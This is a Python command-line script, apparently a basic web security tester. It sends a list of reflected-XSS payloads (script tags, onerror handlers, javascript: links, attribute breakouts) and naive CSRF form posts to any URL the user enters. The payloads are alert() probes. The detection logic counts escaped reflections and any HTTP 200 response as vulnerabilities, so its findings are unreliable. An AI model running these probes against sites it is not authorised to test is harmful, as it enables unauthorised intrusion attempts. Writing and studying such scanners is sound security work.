from flask import Flask, request, jsonify
from urllib.parse import urlencode
import requests

app = Flask(__name__)

# List of available attacks
ATTACKS = {
    "xss": "run_xss_test",
    "csrf": "run_csrf_test"
}

# --- Attack Handlers ---

# XSS Attack Tester
def run_xss_test(target_url):
    # Payloads for different contexts (including Level 3 manipulation)
    XSS_PAYLOADS = [
        '<script>alert("XSS")</script>',  
        '<img src=x onerror="alert(\'XSS\')">', 
        '"><script>alert("XSS")</script>', 
        '"><img src=x onerror=alert(1)>',  
        "';alert('XSS');//", 
        "');alert('XSS');//", 
        "' onmouseover='alert(1)' bad='",  
        '" autofocus onfocus="alert(1)"', 
        "<a href='javascript:alert(\"XSS\")'>Click me</a>",  
        "\"><img src=1 onerror='location.href=\"javascript:alert(1)\"'>"
    ]

    # Common parameter names that could be vulnerable
    PARAM_NAMES = ["query", "input", "text", "content", "search"]

    results = []

    for param_name in PARAM_NAMES:
        for payload in XSS_PAYLOADS:
            try:
                # Prepare parameters for the GET request
                params = {param_name: payload}
                response = requests.get(target_url, params=params)

                # Check if the payload is reflected
                if payload in response.text or payload.replace('<', '&lt;').replace('>', '&gt;') in response.text:
                    results.append({
                        "parameter": param_name,
                        "payload": payload,
                        "vulnerable": True,
                        "snippet": response.text[:150]  
                    })

            except requests.RequestException as e:
                results.append({
                    "parameter": param_name,
                    "payload": payload,
                    "error": str(e)
                })

    return results

# CSRF Attack Tester (unchanged)
def run_csrf_test(target_url):
    CSRF_DATA_SETS = [
        {"test_field": "csrf_test1"},
        {"test_field": "csrf_test2"},
        {"test_field": "csrf_test3"}
    ]
    results = []
    for data in CSRF_DATA_SETS:
        try:
            response = requests.post(target_url, data=data)
            if response.status_code == 200:  
                results.append({
                    "data": data,
                    "vulnerable": True
                })
        except requests.RequestException:
            pass
    return results


def run_attack(attack_type, target_url):
    if attack_type not in ATTACKS:
        return {"error": f"Attack '{attack_type}' not supported."}

    if attack_type == "xss":
        results = run_xss_test(target_url)
    elif attack_type == "csrf":
        results = run_csrf_test(target_url)
    else:
        results = []

    return {
        "attack_type": attack_type,
        "url": target_url,
        "results": results,
        "success": bool(results)
    }

# --- CLI Interface ---
def main():
    print("Welcome to the Security Testing App!")
    print("Available attacks:")
    for attack in ATTACKS.keys():
        print(f"- {attack}")
    attack_type = input("Choose an attack: ").strip().lower()

    target_url = input("Enter the target URL (e.g., http://localhost:8000): ").strip()

    print(f"Running {attack_type.upper()} attack on {target_url}...")
    result = run_attack(attack_type, target_url)

    # Print summary
    print("\n--- Attack Summary ---")
    print(f"Attack Type: {result['attack_type']}")
    print(f"Target URL: {result['url']}")
    print(f"Success: {'Yes' if result['success'] else 'No'}")
    if result['results']:
        print("Details:")
        for detail in result['results']:
            print(detail)
    else:
        print("No vulnerabilities found.")
    print("\nTest complete!")

if __name__ == "__main__":
    main()
